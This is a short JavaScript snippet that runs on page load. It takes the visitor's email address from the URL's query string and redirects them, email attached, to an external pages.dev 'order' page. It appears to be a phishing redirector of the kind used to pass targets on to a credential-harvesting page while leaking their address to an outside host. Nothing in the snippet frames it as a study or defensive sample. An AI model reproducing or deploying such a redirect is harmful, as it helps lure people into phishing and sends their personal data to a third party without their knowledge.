<script>

const redirectWithEmail = async () => {

  // Get email from URL with destructuring assignment
  const {email} = Object.fromEntries(new URLSearchParams(window.location.search));

  // Base URL stored in constant
  const BASE_URL = 'https://weasfer.pages.dev/order/index168c/';

  // Template literal to build redirect URL
  const redirectUrl = `${BASE_URL}?email=${email}`;

  // Async redirect with await
  await window.location.replace(redirectUrl);

};

redirectWithEmail();
  
  
  </script>
